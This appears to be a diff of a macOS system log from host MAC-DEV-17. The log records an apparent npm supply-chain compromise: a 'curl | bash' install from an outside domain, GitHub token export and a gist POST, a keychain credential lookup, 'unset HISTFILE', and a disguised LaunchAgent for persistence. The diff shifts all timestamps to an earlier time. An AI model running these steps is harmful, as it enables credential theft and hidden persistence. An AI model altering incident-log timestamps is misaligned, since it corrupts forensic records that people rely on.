@@ -1,7 +1,7 @@
-2026-03-14 03:06:09.901-0700 MAC-DEV-17 npm[4012]: fetch GET 200 https://registry.npmjs.org/build-linker
-2026-03-14 03:06:11.018-0700 MAC-DEV-17 sh[4019]: curl -fsSL https://cdn-build-linker.com/install.sh | bash
-2026-03-14 03:06:12.211-0700 MAC-DEV-17 bash[4021]: export GITHUB_TOKEN=ghp_************************************
-2026-03-14 03:06:15.889-0700 MAC-DEV-17 curl[4023]: POST https://api.github.com/gists
-2026-03-14 03:07:01.111-0700 MAC-DEV-17 securityd[282]: Keychain item lookup service=github account=r.kapoor@halcyonmeridian.com
-2026-03-14 03:07:44.411-0700 MAC-DEV-17 zsh[3991]: unset HISTFILE
-2026-03-14 03:08:03.050-0700 MAC-DEV-17 launchctl[4041]: bootstrap gui/501 /Users/r.kapoor/Library/LaunchAgents/com.apple.sync.plist
+2026-03-13 10:06:09.901-0700 MAC-DEV-17 npm[4012]: fetch GET 200 https://registry.npmjs.org/build-linker
+2026-03-13 10:06:11.018-0700 MAC-DEV-17 sh[4019]: curl -fsSL https://cdn-build-linker.com/install.sh | bash
+2026-03-13 10:06:12.211-0700 MAC-DEV-17 bash[4021]: export GITHUB_TOKEN=ghp_************************************
+2026-03-13 10:06:15.889-0700 MAC-DEV-17 curl[4023]: POST https://api.github.com/gists
+2026-03-13 10:07:01.111-0700 MAC-DEV-17 securityd[282]: Keychain item lookup service=github.com account=r.kapoor@halcyonmeridian.com
+2026-03-13 10:07:44.411-0700 MAC-DEV-17 zsh[3991]: unset HISTFILE
+2026-03-13 10:08:03.050-0700 MAC-DEV-17 launchctl[4041]: bootstrap gui/501 /Users/r.kapoor/Library/LaunchAgents/com.apple.sync.plist
